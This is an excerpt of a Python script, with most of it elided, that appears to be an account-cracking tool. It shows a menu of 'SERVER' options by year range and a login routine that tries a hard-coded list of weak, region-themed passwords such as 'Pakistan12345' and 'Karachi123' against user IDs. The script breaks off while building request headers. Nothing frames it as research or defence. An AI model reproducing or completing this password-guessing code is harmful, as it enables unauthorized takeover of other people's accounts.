...
def main():
    ...
    lin()    
    print(f"{g}[{r}1{g}] {w}SERVER {r}~ {g}[{w}2008{r}-{w}2024{g}]")
    print(f"{g}[{r}2{g}] {w}SERVER {r}~ {g}[{w}2010{r}-{w}2024{g}]")
    lin()   
...
def login2(uid, tl):
    ...
    try:
        ...
        sys.stdout.flush()
        for pw in ["Pakistan12345", "pakistan12345678", "india12345678", "india123456789", "afghan123", "Lahor123", "king123", "khan123", "panjab123", "Karachi123"]:
            headers = {
